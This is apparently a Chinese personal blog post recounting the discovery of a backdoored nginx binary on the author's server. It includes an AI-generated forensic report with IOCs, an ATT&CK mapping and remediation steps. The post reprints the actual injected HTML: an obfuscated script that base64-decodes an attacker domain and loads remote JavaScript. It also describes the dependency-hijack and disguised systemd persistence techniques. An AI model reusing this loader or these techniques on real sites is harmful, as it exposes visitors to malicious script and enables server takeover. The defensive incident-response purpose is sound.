---
lang: zh
create: 2026-05-09
tags:
  - security
---

# 记录一次 Nginx 替换攻击事件

昨天晚上在公司加班，给同事发了一个链接，发现解析到了一些奇怪的内容，由此才发现我的服务器早已被攻破。经过排查，最终确定是 Nginx 本身被做了手脚，在 GPT 的帮助下，分析了攻击者的攻击手段。

![敏感词汇已打码](/images/blogs/log-an-nginx-replacement-attack/1.png)

## 排查过程

看到这么奇怪的东西我的第一反应就是肯定是服务器出了什么问题，于是我立即使用 curl 去请求了一次 http://www.f1nley.xyz, 结果是拿到了一段 html 文档：

```html
<!DOCTYPE html>
<html>
<head><script>(function(){var s=document.createElement('script');s.src=atob('aHR0cHM6Ly9qai5zb2ZzeHouY29tL2p1bXAuanM=');document.head.appendChild(s);})();</script>
<body></body>
</html>
```

这段 html 就是立即执行了一个 js 脚本，创建了一个新的 script 元素引入了 src 中指向的目标网址。目标网址是 base64 编码，大概是为了规避审查。

解码后得到的是一个 .js 文件的地址: `https://jj.sofsxz.com/jump.js`，直接访问得到的是一个空的页面。

### 排查是否是 docker 镜像和产物的问题

在 docker 里面全局搜相关的代码发现搜不到，基本可以排除是 docker 镜像和产物的问题，那问题就只能出现在服务器上了。

### 定位是服务器的哪里出了问题

在宿主机上执行 `curl -v http://127.0.0.1/ -H 'Host: www.f1nley.xyz'` 后发现，拿到的也是如上所示的恶意代码。
在 docker 容器内执行 curl 拿到的是正常内容。

因此可以判断就是 Proxy 这一层出了问题。

然而排查 nginx 的相关配置并没有发现有相关的代码的痕迹。

在 GPT 的提示和帮助下，开始排查是否这个请求真的命中了 nginx server block: 在 server block 上添加一个自定义的 header 检查是否能拿到 header

```nginx
server {
    # ...
    add_header X-Probe 'probe';
}
```

发现确实有这个 header, 说明确实命中了 nginx 的这个 server block，但是返回的并不是预期的处理，此时 GPT 怀疑 Nginx 本身已经被替换掉了。

## 取证

接下来的步骤基本上就是 GPT 让我干啥我干啥了，已经脱离了我的认知，大概是直接去找 nginx 的二进制，然后执行 dpkg 命令去检查 checksum，结果发现对不上，因此基本上可以判断是 nginx 本身被替换掉了。

## 处理

1. 将证据材料下载后，丢给 AI 进行分析
2. 立即重装此服务器
3. 重装后立即关掉 root 账号的 ssh 密码登录
4. 由于不知道泄露了多少密钥，立即轮换所有密钥

## 分析

> 以下内容为 AI 生成

## Nginx 入侵事件总结报告

- 报告日期: 2026-05-09
- 分析对象: `nginx-incident-2026-05-08-110637.tgz`
- 证据包 SHA-256: `97aa3c24f4aa21243d4b7d0809e5f9885b6aeb471aa938c2bc20edbc09a53677`
- 结论级别: `高置信度`
- 事件等级: `Critical`

### 结论

本次事件不是单纯的 `nginx` 配置异常，而是一次明确的二进制级后门化植入。攻击者已经获得目标运行环境的写权限，并将运行中的 `nginx` 替换为带恶意依赖的 ELF 可执行文件，再通过恶意 HTTP 模块接管响应过滤链，实现基于规则的内容注入与本地控制。

现有证据同时显示宿主机侧存在伪装的 `systemd` 服务持久化痕迹，因此影响面很可能已经超过单个 `nginx` 容器。当前更合理的定性是“宿主机与容器均应按已沦陷处理”。

### 证据范围

本报告基于离线取证包中的以下证据：

- `nginx-incident/hashes.txt`
- `nginx-incident/nginx.tampered`
- `nginx-incident/sysutil_http.so`
- `nginx-incident/processes.txt`
- `nginx-incident/fds.txt`
- `nginx-incident/1114748.environ.txt`
- `nginx-incident/1114801.environ.txt`
- `nginx-incident/etc-nginx-copy/`
- `nginx-incident/nginx-logs/`
- `etc/systemd/system/`
- `root/.ssh/authorized_keys`

本次分析全程为只读静态检查，未执行取证包内任何二进制或脚本。

### 关键发现

#### 1. `nginx` 已被二进制级篡改

证据文件 `nginx-incident/hashes.txt` 记录了现场运行文件：

- `/usr/sbin/nginx`
- `/usr/lib/.cache/sysutil_http.so`

对应哈希如下：

- `1daf07db2f05f759acd4052ec2bbd2b6dbf70d3a1d4d8f7d33fce4ef4dc01090  /usr/sbin/nginx`
- `10a510bf98eea8e597edee84016b1a375c4c2bc08428fa9e8202cecaca3be02a  /usr/lib/.cache/sysutil_http.so`

对 `nginx.tampered` 的 ELF 动态依赖检查显示，它除了正常依赖外，还额外声明了异常库：

- `libnss_cache.so.2`

这不是正常 Debian `nginx 1.22.1` 的依赖形态，说明攻击者很可能通过修改 ELF `DT_NEEDED` 项，把恶意逻辑挂入 `nginx` 启动流程。

#### 2. 恶意模块具备 HTTP 流量劫持与注入能力

`sysutil_http.so` 是未 strip 的 Linux shared object，导出符号与可读字符串直接暴露了模块能力。关键符号包括：

- `ngx_http_oam_module`
- `ngx_http_oam_header_filter`
- `ngx_http_oam_body_filter`
- `socket_server_thread`
- `handle_socket_command`
- `oam_register_filters`

关键字符串包括：

- `STATUS`
- `ADD:`
- `DEL:`
- `LIST`
- `CLEAR`
- `/var/run/sysutil/sysproc.sock`
- `/var/run/sysutil/socket.lock`
- `text/html; charset=utf-8`
- `<head>`
- `<body></body>`
- `atob('`

这说明该模块会：

1. 接管 `nginx` 的 header/body filter 链
2. 在本地创建控制 socket
3. 接收 `STATUS/ADD/DEL/LIST/CLEAR` 命令动态管理规则
4. 针对 HTML 响应执行内容注入

从能力模型看，这更接近“可热更新规则的恶意 server-side 注入组件”，典型用途包括：

- 注入恶意 JavaScript
- 注入钓鱼页面片段
- 劫持会话或窃取 token/cookie
- 按请求特征定向投放恶意内容

#### 3. 正常 `nginx` 配置基本未改，恶意逻辑不在配置层

取证包中的 `etc-nginx-copy/nginx.conf` 未见显式恶意 `load_module` 指令，核心结构仍是正常站点配置：

- `include /etc/nginx/modules-enabled/*.conf;`
- `include /etc/nginx/conf.d/*.conf;`
- `include /etc/nginx/sites-enabled/*;`

这说明攻击者没有依赖传统的配置注入方式加载模块，恶意代码更可能通过二进制依赖劫持自动装载。

#### 4. 当前运行实例位于容器内

`processes.txt` 显示：

- `containerd-shim-runc-v2` 为父进程
- `nginx: master process nginx -g daemon off;` 为子进程

这说明当前被植入的 `nginx` 运行在容器环境中，而不是直接由宿主机 `systemd` 启动。容器内被替换的可能位置包括：

- 容器可写层
- 被污染的镜像层
- 启动后被远程写入的运行时文件系统

#### 5. 运行身份出现异常

配置文件中声明 `user www-data;`，但现场 worker 进程显示为：

- `sshd     1114801 ... nginx: worker process`

这个现象不符合正常 `nginx` worker 用户模型，说明运行时环境已经发生异常偏移，可能涉及：

- 容器 namespace / UID 映射异常
- 运行进程上下文被篡改
- 取证时刻的宿主映射状态异常

这进一步支持“当前环境已被深入操控”的判断。

#### 6. 宿主机侧存在可疑 `systemd` 持久化

`etc/systemd/system/` 中出现两个高风险对象：

##### 可疑服务 1: `qemu-fpm.service`

服务内容：

```ini
[Unit]
Description=QEMU FPM Service
After=network.target

[Service]
Type=forking
ExecStart=/usr/bin/qemu-system-fpm
Restart=always
RestartSec=5
StandardOutput=null
StandardError=null

[Install]
WantedBy=multi-user.target
```

风险点：

- 名称伪装成正常系统组件
- 二进制名 `qemu-system-fpm` 极不自然
- 自启动
- 常驻重启
- 输出静默

##### 可疑服务 2: `6.1.0-28-cloud-amd64-load.service`

该对象以启用链接形式存在于：

- `etc/systemd/system/multi-user.target.wants/6.1.0-28-cloud-amd64-load.service`

它的命名方式伪装成内核版本/驱动加载组件，具有明显隐蔽性。取证包中未包含其最终目标文件内容，因此当前只能确认“已启用链接存在”，仍需在原宿主机磁盘镜像中继续追踪其真实服务文件。

#### 7. 初始入口尚未被精确锁定，但 `ai` 上游与开放同步服务是重点排查面

取证包中的访问日志和错误日志显示了大量互联网扫描、随机子域名探测与应用层枚举。最值得优先排查的两个暴露面是：

##### 暴露面 1: `ai.f1nley.xyz -> 127.0.0.1:8000`

配置显示：

- `server_name ai.f1nley.xyz;`
- `proxy_pass http://127.0.0.1:8000;`

错误日志中大量请求通过随机子域名命中该 upstream，路径形态明显偏攻击探测，例如：

- `/Public/...`
- `/api/...`
- `/Template/...`
- `/mms-api/...`
- `/prod-api/...`

这类流量更像针对某类现成应用框架或后台系统的自动化探测。

##### 暴露面 2: `/sync/notes/` WebDAV/同步服务

访问日志显示 `/sync/notes/` 长期暴露，并且有稳定认证主体 `root` 出现在日志中。虽然这些流量很像合法同步客户端，但这说明：

- 该服务长期对外可达
- 使用高权限身份进行同步
- 一旦认证泄露或上游实现存在漏洞，风险会显著放大

现有证据不足以将其直接定为入口，但必须纳入复盘范围。

### 攻击链重建

基于当前证据，可重建出如下高概率攻击路径：

1. 攻击者首先获得容器或宿主机的文件写权限
2. 攻击者将恶意模块投放到 `/usr/lib/.cache/sysutil_http.so`
3. 攻击者修改 `nginx` ELF 依赖，使其在启动时自动装载异常库
4. 恶意模块在 `nginx` 初始化过程中接管 HTTP filter
5. 模块在本地创建 `/var/run/sysutil/sysproc.sock`，作为控制面
6. 攻击者可通过本地 socket 动态下发匹配规则和注入内容
7. 宿主机侧通过伪装 `systemd` 服务维持持久化，确保重启后仍可恢复控制

### 时间线

以下时间基于取证包内文件时间和日志时间，属于“当前证据可见时间线”：

- `2025-10-16 07:10:02 +0800`
  - `etc/systemd/system/qemu-fpm.service` 出现
- `2026-01-04 01:25:44 +0800`
  - `6.1.0-28-cloud-amd64-load.service` 启用链接存在
- `2026-01-04 04:49:15 +0800`
  - `sysutil_http.so` 文件时间
- `2026-05-05`
  - 被篡改的 `nginx` 进程已经在容器中运行
- `2026-05-08 23:07:24 +0800`
  - 取证包生成

说明：

- `nginx.tampered` 自身时间较老，更像被故意伪造或保留原始包时间，不能单独作为植入时间依据
- `sysutil_http.so` 与可疑 `systemd` 启用时间更值得参考

## ATT&CK 技术映射

| 战术                               | 技术                                                         | 说明                                                             |
| ---------------------------------- | ------------------------------------------------------------ | ---------------------------------------------------------------- |
| Persistence                        | `T1543.002` Create or Modify System Process: Systemd Service | 伪装 `systemd` 服务维持启动                                      |
| Persistence / Privilege Escalation | `T1574.006` Hijack Execution Flow: Dynamic Linker Hijacking  | 篡改 `nginx` 依赖链                                              |
| Persistence / Execution            | `T1505` Server Software Component                            | 恶意 `nginx` HTTP 模块                                           |
| Defense Evasion                    | `T1036` Masquerading                                         | `qemu-fpm.service`、`6.1.0-28-cloud-amd64-load.service` 伪装命名 |
| Command and Control                | `T1095` Non-Application Layer Protocol / Local IPC 近似      | 本地 Unix socket 控制面                                          |
| Impact / Collection                | 自定义 Web 注入能力                                          | 基于规则修改响应内容                                             |

### IOC 清单

#### 文件与路径

- `/usr/sbin/nginx`
- `/usr/lib/.cache/sysutil_http.so`
- `/var/run/sysutil/`
- `/var/run/sysutil/socket.lock`
- `/var/run/sysutil/sysproc.sock`
- `/etc/systemd/system/qemu-fpm.service`
- `/etc/systemd/system/multi-user.target.wants/6.1.0-28-cloud-amd64-load.service`

#### 哈希

- `1daf07db2f05f759acd4052ec2bbd2b6dbf70d3a1d4d8f7d33fce4ef4dc01090` (`/usr/sbin/nginx`)
- `10a510bf98eea8e597edee84016b1a375c4c2bc08428fa9e8202cecaca3be02a` (`/usr/lib/.cache/sysutil_http.so`)

#### 符号与字符串

- `ngx_http_oam_module`
- `ngx_http_oam_header_filter`
- `ngx_http_oam_body_filter`
- `oam_register_filters`
- `STATUS`
- `ADD:`
- `DEL:`
- `LIST`
- `CLEAR`
- `libnss_cache.so.2`

#### 可疑服务名

- `qemu-fpm.service`
- `6.1.0-28-cloud-amd64-load.service`

### 影响评估

当前证据支持以下影响判断：

- `nginx` 已失去可信性，不能再作为可信边界组件使用
- 任意经过该实例的 HTML 响应都可能被动态注入
- 受影响业务可能包括主站流量、反代业务和下游应用会话
- 宿主机存在额外持久化，说明单纯替换容器并不能保证清除风险

因此本事件应按“主机级 compromise”响应，而不是“单容器异常”响应。

### 当前不确定项

以下问题在本取证包内无法完全回答：

- 初始入口是宿主机、容器镜像、上游应用还是外部管理面
- `6.1.0-28-cloud-amd64-load.service` 的真实内容
- `libnss_cache.so.2` 在现场的实际落点
- 恶意模块已下发过哪些规则
- 是否已经对外注入过恶意脚本或跳转内容
- 是否存在额外未被打包进证据包的反连、下载器或横向移动痕迹

原因是取证包中的以下系统级日志为空：

- `var/log/auth.log`
- `var/log/syslog`
- `var/log/dpkg.log`
- `var/log/apt/history.log`

这会阻断对初始入侵、提权、持久化创建命令和包管理伪装的还原。

### 处置建议

#### 立即动作

1. 将宿主机与相关容器全部从网络隔离
2. 保留当前宿主机磁盘快照、容器镜像、可写层和内存证据
3. 停止把该实例继续作为生产入口使用
4. 轮换所有经过该主机的凭据与密钥

#### 重建原则

1. 从可信源重建宿主机，不做就地“清理后继续用”
2. 从可信 Dockerfile / 镜像仓库重新构建容器镜像
3. 对镜像仓库、CI/CD、部署机一并做 IOC 搜索
4. 对下游上游应用逐一排查是否存在同类植入

#### 重点排查对象

1. `127.0.0.1:8000` 对应应用及其代码仓库
2. 容器镜像构建链、发布机和 registry
3. 宿主机 `/lib/systemd/system/6.1.0-28-cloud-amd64-load.service`
4. 宿主机 `/usr/bin/qemu-system-fpm`
5. 任何名为 `libnss_cache.so.2` 的文件实际落点
6. 所有以 `sysutil`、`oam`、`qemu-fpm` 命名的文件与进程

### 建议的后续取证补充

为了把入口和影响面完全钉实，建议补采以下证据：

- 宿主机完整 `/lib/systemd/system/` 与 `/usr/lib/systemd/system/`
- 宿主机 `/usr/bin/qemu-system-fpm`
- 宿主机或容器内 `libnss_cache.so.2`
- 宿主机 `journalctl` 导出
- Docker/containerd 容器元数据与镜像历史
- 容器文件系统 diff
- `127.0.0.1:8000` 上游应用代码与运行日志
- 反向代理前后的访问日志与 WAF/CDN 日志

### 附录：可直接引用的核心证据

- `nginx-incident/hashes.txt`
  - 证明现场运行的 `nginx` 与 `sysutil_http.so` 样本路径和哈希
- `nginx-incident/processes.txt`
  - 证明 `nginx` 由 `containerd-shim-runc-v2` 拉起，运行于容器环境
- `nginx-incident/etc-nginx-copy/nginx.conf`
  - 证明正常配置层未显式加载恶意模块
- `nginx-incident/etc-nginx-copy/conf.d/ai.conf`
  - 证明 `ai.f1nley.xyz` 反代到 `127.0.0.1:8000`
- `etc/systemd/system/qemu-fpm.service`
  - 证明宿主机存在高风险伪装服务
- `etc/systemd/system/multi-user.target.wants/6.1.0-28-cloud-amd64-load.service`
  - 证明宿主机存在高风险伪装自启动链接
